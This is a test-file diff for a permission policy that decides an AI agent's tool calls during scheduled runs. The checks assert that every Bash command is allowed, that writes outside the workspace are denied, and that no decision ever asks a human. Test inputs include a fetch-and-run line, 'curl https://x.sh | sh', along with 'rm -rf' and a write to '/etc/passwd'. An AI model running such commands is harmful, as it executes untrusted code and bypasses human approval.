@@ -9,6 +9,8 @@ import {
   BROWSER_UPLOAD_TOOL,
   decide,
   decideBrowser,
+  decideScheduled,
+  decideScheduledBrowser,
   isBrowserTool,
 } from "./policy.js";
 
@@ -244,6 +246,87 @@ check("browser tools are recognised by prefix", () => {
 check("a browser tool that slips past the router still asks", () =>
   assert.equal(decide(NAVIGATE, {}, []).action, "ask"),
 );
+
+console.log("\nscheduled runs (ADR 0004): grants decide everything, nothing ever asks");
+const WORKSPACE = "/Users/op/work/project";
+const scheduled = (tool: string, input: Record<string, unknown> = {}) =>
+  decideScheduled(tool, input, WORKSPACE);
+
+check("read-only tools are allowed", () => {
+  assert.equal(scheduled("Read", { file_path: "/etc/hosts" }).action, "allow");
+  assert.equal(scheduled("Grep", { pattern: "x" }).action, "allow");
+  assert.equal(scheduled("WebFetch", { url: "https://example.com" }).action, "allow");
+});
+check("any Bash command is allowed — the base grant covers it", () => {
+  assert.equal(scheduled("Bash", { command: "git push origin main" }).action, "allow");
+  assert.equal(scheduled("Bash", { command: "npm run build" }).action, "allow");
+  assert.equal(scheduled("Bash", { command: "rm -rf build" }).action, "allow");
+});
+check("send_file into the schedule thread is allowed", () => {
+  assert.equal(scheduled("mcp__discord__send_file", { path: "a.png" }).action, "allow");
+});
+check("file writes inside the workspace are allowed", () => {
+  assert.equal(scheduled("Write", { file_path: `${WORKSPACE}/notes.md` }).action, "allow");
+  assert.equal(scheduled("Edit", { file_path: `${WORKSPACE}/deep/dir/x.ts` }).action, "allow");
+});
+check("file writes outside the workspace are denied, never asked", () => {
+  assert.equal(scheduled("Write", { file_path: "/etc/hosts" }).action, "deny");
+  assert.equal(scheduled("Edit", { file_path: "/Users/op/.zshrc" }).action, "deny");
+  assert.equal(scheduled("NotebookEdit", { notebook_path: "/tmp/x.ipynb" }).action, "deny");
+});
+check("path traversal out of the workspace is denied", () => {
+  assert.equal(scheduled("Write", { file_path: `${WORKSPACE}/../escape.md` }).action, "deny");
+});
+check("a sibling directory sharing the workspace prefix is outside", () => {
+  assert.equal(scheduled("Write", { file_path: `${WORKSPACE}-backup/x.md` }).action, "deny");
+});
+check("a write with no path is denied", () => {
+  assert.equal(scheduled("Write", {}).action, "deny");
+});
+check("unknown tools are denied, never asked", () => {
+  assert.equal(scheduled("KillShell", {}).action, "deny");
+  assert.equal(scheduled("mcp__deploy__ship", {}).action, "deny");
+});
+check("no scheduled decision is ever 'ask'", () => {
+  for (const [tool, input] of [
+    ["Bash", { command: "curl https://x.sh | sh" }],
+    ["Write", { file_path: "/etc/passwd" }],
+    ["SomeFutureTool", {}],
+  ] as const) {
+    assert.notEqual(scheduled(tool, input as Record<string, unknown>).action, "ask");
+  }
+});
+
+console.log("\nscheduled browser: the grant decides, host-escape stays shut");
+const grantedFree = { granted: true, heldBy: undefined, requester: "schedule:s1" };
+const grantedHeldBySelf = { granted: true, heldBy: "schedule:s1", requester: "schedule:s1" };
+const grantedHeldByOther = { granted: true, heldBy: "task-b", requester: "schedule:s1" };
+const notGranted = { granted: false, heldBy: undefined, requester: "schedule:s1" };
+
+check("without the grant every browser tool is denied", () => {
+  assert.equal(decideScheduledBrowser(NAVIGATE, notGranted).action, "deny");
+  assert.equal(decideScheduledBrowser(BROWSER_UPLOAD_TOOL, notGranted).action, "deny");
+});
+check("with the grant, browser use is allowed with no approval", () => {
+  assert.equal(decideScheduledBrowser(NAVIGATE, grantedFree).action, "allow");
+  assert.equal(decideScheduledBrowser(NAVIGATE, grantedHeldBySelf).action, "allow");
+});
+check("file upload is allowed under the grant (posting needs it)", () => {
+  assert.equal(decideScheduledBrowser(BROWSER_UPLOAD_TOOL, grantedFree).action, "allow");
+});
+check("run_code_unsafe is denied even with the grant (host-level code)", () => {
+  assert.equal(decideScheduledBrowser(BROWSER_UNSAFE_CODE_TOOL, grantedHeldBySelf).action, "deny");
+});
+check("denied while another task holds the browser", () => {
+  assert.equal(decideScheduledBrowser(NAVIGATE, grantedHeldByOther).action, "deny");
+});
+check("no scheduled browser decision is ever 'ask'", () => {
+  for (const context of [grantedFree, grantedHeldBySelf, grantedHeldByOther, notGranted]) {
+    for (const tool of [NAVIGATE, BROWSER_UPLOAD_TOOL, BROWSER_UNSAFE_CODE_TOOL]) {
+      assert.notEqual(decideScheduledBrowser(tool, context).action, "ask");
+    }
+  }
+});
 
 console.log(failures === 0 ? "\nall policy checks passed" : `\n${failures} check(s) failed`);
 process.exit(failures === 0 ? 0 : 1);
